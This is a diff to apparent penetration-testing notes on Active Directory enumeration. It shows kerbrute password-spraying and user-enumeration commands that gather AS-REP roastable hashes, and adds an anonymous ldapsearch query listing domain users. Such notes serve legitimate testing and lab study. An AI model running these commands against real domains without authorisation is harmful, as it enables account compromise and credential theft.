@@ -19,7 +19,7 @@ kerbrute passwordspray --dc $TARGET_IP -d $TARGET_AD users -t 100 -v --user-as-p
 
 Dev version of kerbrute auto-checks for AS-REP roastable accounts
 ```bash
-kerbrute userenum --dc $TARGET_IP --domain $AD_DOMAIN --hash-file hashes --downgrade
+kerbrute userenum --dc $TARGET_IP --domain $AD_DOMAIN --hash-file hashes --downgrade users
 ```
 
 LDAP
@@ -30,6 +30,10 @@ nmap -n -sV --script "ldap* and not brute" $TARGET_IP
 
 ```bash
 ldapsearch -x -H ldap://$TARGET_IP -b 'DC=$DOMAIN$,DC=$DOMEXT' | grep -B2 Person | grep "@" | awk '{print $2}'
+```
+
+```bash
+ldapsearch -H ldap://$TARGET_IP -x -b "DC=$DOMAIN,DC=local" '(objectClass=person)'
 ```
 AS-REP Roasting
 ---
